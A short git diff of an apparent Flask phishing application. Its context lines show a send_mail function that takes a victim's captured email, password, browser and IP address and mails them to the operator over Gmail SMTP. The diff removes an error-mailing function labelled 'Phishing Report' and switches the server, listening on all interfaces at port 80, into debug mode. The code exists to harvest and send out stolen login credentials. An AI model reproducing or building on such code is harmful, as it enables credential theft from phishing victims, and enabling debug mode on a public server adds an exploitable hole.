@@ -22,17 +22,6 @@ def send_mail(taremail,password,browser,user_ip,redirected_to,email_,password_):
         server.sendmail(email_, email_, message)
         server.quit()
 
-def err_send_mail(taremail,password,msg):
-
-	
-
-        message = "Subject: Phishing Report\n\nAn Error Accoured:\nLogs:\n" +"\n"  + str(msg)
-
-        server = smtplib.SMTP("smtp.gmail.com", 587)
-        server.starttls()
-        server.login(taremail,password)
-        server.sendmail(taremail, taremail, msg)
-        server.quit()
 
 
 @app.route('/',methods=["GET","POST"])
@@ -58,4 +47,4 @@ def index():
 	return render_template('index.html')
 
 if __name__ == "__main__":
-    app.run(host='0.0.0.0',port='80')
+    app.run(host='0.0.0.0',port='80',debug=True)
